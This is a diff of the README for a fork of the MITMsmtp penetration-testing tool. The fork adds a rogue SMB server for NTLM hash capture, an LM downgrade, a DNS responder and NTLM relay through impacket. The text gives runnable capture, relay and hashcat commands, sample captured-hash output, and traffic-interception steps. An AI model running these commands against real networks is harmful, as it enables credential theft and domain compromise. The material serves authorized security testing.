@@ -3,6 +3,23 @@ MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login crede
 
 MITMsmtp offers a command line tool as well as an open Python3 API which can be used to build own tools for automated pentesting of applications.
 
+## Fork Notice (Tantalum Labs)
+This repository is a fork of the original MITMsmtp project by Robin Meis (upstream: https://github.com/RobinMeis/MITMsmtp) and is maintained by Tantalum Labs.
+
+See `CHANGELOG.md` for a summary of the features and fixes added in this fork.
+
+**Legal/Ethical Use:** Use only on systems you own or where you have explicit permission to test.
+
+### Highlights (this fork)
+* Optional built-in DNS responder for lab setups (`--enable-dns`, `--dns-ip`, `--print-dns`)
+* Optional rogue SMB server to capture NTLM credentials (NetNTLMv1/NetNTLMv2 hashes) from SMB clients such as printers using "Scan to SMB" (`--enable-smb`, `--print-smb`)
+* Optional NTLM "Force LM downgrade" to coax legacy clients into the weaker LMv1/NTLMv1 response (`--smb-force-lm-downgrade`)
+* Optional NTLM relay mode that delegates live relaying to impacket's `ntlmrelayx` (`--relay`, optional dependency)
+* All three servers (SMTP, DNS, SMB) can run together from a single runner so a device can be redirected and have its hostname resolved and credentials captured in one shot
+* More robust SMTP handling (safe socket decoding, better `MAIL FROM`/`RCPT TO` parsing, cleaner `QUIT` handling)
+* Authentication flow fixes (successful AUTH now responds with `235`, tolerate clients trying multiple AUTH methods)
+* Helper script `MITMsmtp/smtp_test.py` to validate STARTTLS/SMTPS authentication in a controlled environment
+
 ## Compatibility
 MITMsmtp has been tested against the SMTP client of Thunderbird 60.5.3 and some other SMTP clients.
 
@@ -26,7 +43,7 @@ MITMsmtp requires Python3 and setuptools. You might want to install git as well.
 
 Now just clone the MITMsmtp repository:
 
-`git clone https://github.com/RobinMeis/MITMsmtp.git`
+`git clone <this-fork-repo-url>`
 
 Change into MITMsmtp directory and start the installation:
 
@@ -42,8 +59,21 @@ That's it!
 ## Usage
 *MITMsmtp can be used as standalone command line application and offers an easy to use Python3 API to integrate in your own project*
 
-### Command Line
-Running `MITMsmtp --help` will give you an overview about the available command line switches:
+### Command Line (Tantalum Labs runner)
+This fork includes an updated standalone runner at `MITMsmtp/MITMsmtp.py` with optional DNS responder and rogue SMB server support. The SMTP, DNS and SMB servers can be enabled independently or all together:
+
+* Show options: `python3 MITMsmtp/MITMsmtp.py --help`
+* Plain SMTP: `python3 MITMsmtp/MITMsmtp.py --port 587 --print-lines`
+* STARTTLS: `python3 MITMsmtp/MITMsmtp.py --STARTTLS --port 587 --print-lines`
+* SMTPS (implicit TLS): `python3 MITMsmtp/MITMsmtp.py --SSL --port 465 --print-lines`
+* DNS responder + SMTP (lab use): `sudo python3 MITMsmtp/MITMsmtp.py --enable-dns --dns-ip <YOUR_IP> --print-dns --print-lines`
+* SMB credential capture (e.g. printer Scan to SMB): `sudo python3 MITMsmtp/MITMsmtp.py --enable-smb --print-smb`
+* SMB with forced LM downgrade: `sudo python3 MITMsmtp/MITMsmtp.py --enable-smb --smb-force-lm-downgrade --print-smb`
+* Everything at once (DNS + SMTP + SMB): `sudo python3 MITMsmtp/MITMsmtp.py --enable-dns --dns-ip <YOUR_IP> --enable-smb --print-dns --print-smb --print-lines`
+* NTLM relay via impacket (needs `pip install impacket`): `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target ldaps://dc01 --enable-dns --dns-ip <YOUR_IP>`
+
+### Command Line (legacy packaged entrypoint)
+Running `MITMsmtp --help` will give you an overview about the available command line switches (legacy CLI; default port 8587):
 ```
 usage: MITMsmtp [-h] [--server_address SERVER_ADDRESS] [--port PORT]
                 [--server_name SERVER_NAME] [--STARTTLS] [--SSL]
@@ -99,7 +129,74 @@ Recipients: recipient-a@example.com
 If you want to get the full message, you have to enable logging.
 
 ### Logging
-Running `MITMsmtp --log logdir` will enable logging. Please make sure that the directory exists. MITMsmtp will create n+1 files while n is the amount of received messages. Each mail will be written into a new file like it has been received. Additionally all received credentials are stored in `credentials.log`.
+Running `MITMsmtp --log logdir` will enable logging in the legacy CLI. Please make sure that the directory exists. MITMsmtp will create n+1 files while n is the amount of received messages. Each mail will be written into a new file like it has been received. Additionally all received credentials are stored in `credentials.log`.
+
+### SMB credential capture (printers / scanners)
+Many multifunction printers, scanners and appliances offer a "Scan to SMB" (a.k.a. "Scan to network folder") feature that authenticates to an SMB share using a configured service account. When you can convince such a device to connect to a machine you control (for example via the bundled DNS responder, ARP spoofing, or simply by entering your host as the SMB target), this fork can stand up a rogue SMB server that captures the NTLM authentication and reconstructs the NetNTLMv1/NetNTLMv2 hash for offline cracking.
+
+Start the runner with `--enable-smb` (port 445 requires root):
+
+`sudo python3 MITMsmtp/MITMsmtp.py --enable-smb --print-smb`
+
+Point the device's SMB/scan target at your host. When it authenticates you will see something like:
+
+```
+[SMB] *** NetNTLMv2 HASH CAPTURED *** from 192.168.1.50
+[SMB] User: CONTOSO\scan-svc (workstation: RICOH-MFP)
+[SMB] NetNTLMv2 (hashcat -m 5600)
+[SMB] scan-svc::CONTOSO:1122334455667788:<NTProofStr>:<blob>
+```
+
+Crack the captured hash offline, e.g. with hashcat:
+
+* NetNTLMv2: `hashcat -m 5600 captured.txt wordlist.txt`
+* NetNTLMv1: `hashcat -m 5500 captured.txt wordlist.txt`
+
+Useful options:
+
+* `--smb-port` &mdash; listen on a non-standard port (default `445`)
+* `--smb-challenge` &mdash; set the 8-byte server challenge as 16 hex chars (default `1122334455667788`; a fixed challenge lets you use precomputed/rainbow tables)
+* `--smb-target-name` &mdash; the NetBIOS/domain name advertised to clients (default `WORKGROUP`)
+* `--smb-force-lm-downgrade` &mdash; force clients into the legacy LMv1/NTLMv1 response so you capture the much weaker LM hash. This advertises a challenge without extended session security or target info, which makes the client compute the legacy 24-byte LM/NT responses (crack with `hashcat -m 5500`). Useful against older printers/devices that still honour the downgrade; modern hosts may refuse or send a null LM response.
+* `--smb-log` &mdash; directory to append captured hashes to (`smb_credentials.log`)
+* `--print-smb` &mdash; print SMB protocol activity
+
+The SMB server only implements enough of SMB2 to elicit and capture the NTLM authentication; it does not serve files, so after credentials are captured the client is told the logon failed. Challenge-response auth means the cleartext password is not exposed directly &mdash; you capture a crackable hash. Combine `--enable-smb` with `--enable-dns` to also resolve the share's hostname to your machine.
+
+### NTLM relay (impacket integration)
+Capturing a hash (above) lets you crack it *offline*. **Relaying** is a different, live attack: instead of answering the client with our own challenge, the authentication is forwarded to a third-party target so that the target authenticates you *as the victim*, handing you an authenticated session you can act on (dump secrets, add a machine account, abuse LDAP ACLs, proxy the session over SOCKS, and so on).
+
+Rather than reimplement this, MITMsmtp delegates relaying to [impacket](https://github.com/fortra/impacket)'s mature `ntlmrelayx`. The `--relay` flag builds and runs `ntlmrelayx` from MITMsmtp's options and streams its output prefixed with `[RELAY]`.
+
+Install the optional dependency first:
+
+`pip install impacket`  (or `pip install MITMsmtp[relay]`)
+
+Examples:
+
+* Relay to a single SMB target: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target smb://10.0.0.5`
+* Cross-protocol relay to LDAPS with SOCKS: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target ldaps://dc01 --relay-socks`
+* Multiple targets from a file: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-targets-file targets.txt`
+* DNS coercion + relay (the useful combo): `sudo python3 MITMsmtp/MITMsmtp.py --enable-dns --dns-ip <YOUR_IP> --relay --relay-target ldaps://dc01`
+* See the exact `ntlmrelayx` command without running it: `python3 MITMsmtp/MITMsmtp.py --relay --relay-target smb://10.0.0.5 --relay-dry-run`
+
+Relay options:
+
+* `--relay-target TARGET` &mdash; a relay target such as `smb://host`, `ldap://host`, `ldaps://host`, `http://host`; repeatable
+* `--relay-targets-file FILE` &mdash; a file of targets, one per line (`ntlmrelayx -tf`)
+* `--relay-socks` &mdash; start the `ntlmrelayx` SOCKS proxy so relayed sessions can be reused (`-socks`)
+* `--relay-ip IP` &mdash; bind `ntlmrelayx`'s listeners to a specific IP (`-ip`)
+* `--relay-output-prefix PREFIX` &mdash; file prefix for dumped loot (`-of`)
+* `--relay-no-smb2support` &mdash; omit `-smb2support` (it is passed by default; most clients use SMB2+)
+* `--relay-extra "..."` &mdash; raw arguments passed verbatim to `ntlmrelayx` for anything not exposed above (e.g. `--relay-extra "--remove-mic -debug"`)
+* `--relay-bin PATH` &mdash; explicit path to `ntlmrelayx(.py)` if it is not on your `PATH`
+* `--relay-dry-run` &mdash; print the command that would be run, then exit
+
+Important constraints:
+
+* **Port ownership:** `ntlmrelayx` binds its own SMB (445) and HTTP (80) listeners, so `--relay` is **mutually exclusive with `--enable-smb`**. The DNS responder (`--enable-dns`) and the SMTP server still run alongside it.
+* **Signing kills SMB&rarr;SMB relay:** relaying only works when the *target* does not enforce session signing (we never learn the session key). Modern domain controllers require SMB signing, which is why cross-protocol relay (SMB&rarr;LDAP/LDAPS for RBCD or shadow credentials, SMB&rarr;HTTP for ADCS ESC8) is usually the productive path. This is a property of the target, not of MITMsmtp.
+* You are not relaying a "hash" &mdash; you are relaying the live NTLMSSP tokens, so relay mode does not also produce an offline-crackable hash for that authentication. Choose `--relay` (live) or `--enable-smb` (offline capture) per engagement.
 
 ### Encryption
 Some clients fallback to unencrypted mode if you don't offer SSL/TLS. Always make sure to test this! For clients which don't fallback, you may want to test the encrypted mode. Please keep in mind, that a correctly configured client won't be vulnerable to this attack. You will be unable to fake a trusted certificate for a validated common name and thus the client will stop connection before sending credentials. However some clients don't implement proper certificate validation. This is where this attack starts.
@@ -117,6 +214,31 @@ To use MITMsmtp with the example certificates run `MITMsmtp --SSL`.
 ### API
 For an example you might want to consult `MITMsmtp/__main__.py`. More docs will be available soon!
 
+The SMB server is also usable as a small standalone Python API. Provide a `capture_callback` to receive each captured credential as a dict (`username`, `domain`, `workstation`, `version`, `hashcat_mode`, `credential`):
+
+```python
+from MITMsmtp.SMBServer import SMBServer
+
+def on_capture(client_ip, result):
+    print("Captured %s from %s: %s" % (result["version"], client_ip, result["credential"]))
+
+smb = SMBServer(listen_address="0.0.0.0", listen_port=445,
+                target_name="WORKGROUP", force_lm_downgrade=False,
+                capture_callback=on_capture)
+smb.start()
+# ... run until done ...
+smb.stop()
+```
+
+### Helper: smtp_test.py
+This fork includes `MITMsmtp/smtp_test.py`, a small script to validate SMTP authentication against a server that you control (useful for verifying TLS mode selection and reproducing client auth behavior in a lab).
+
+Examples:
+
+* STARTTLS (port defaults to 587): `python3 MITMsmtp/smtp_test.py --startls --smtp 127.0.0.1 --user test@example.com --pass testpass --insecure`
+* SMTPS / implicit TLS (port defaults to 465): `python3 MITMsmtp/smtp_test.py --ssl --smtp 127.0.0.1 --user test@example.com --pass testpass --insecure`
+* Specify a port: `python3 MITMsmtp/smtp_test.py --startls --smtp 127.0.0.1:587 --user test@example.com --pass testpass --debug`
+
 ## MITM
 This section shows the usage of MITMsmtp if you are able to intercept the victims traffic.
 
@@ -133,7 +255,7 @@ To make sure that out victim doesn't find a way around us, block ICMP redirects:
 
 `sysctl -w net.ipv4.conf.all.send_redirects=0`
 
-Next we create a port forwarding rule from SMTP default port 587 to MITMsmtp. Please make sure that your victim uses port 587 and adjust if needed.
+Next we create a port forwarding rule from SMTP default port 587 to MITMsmtp (legacy default is 8587; adjust to match your local listener port).
 
 `iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-port 8587`
 
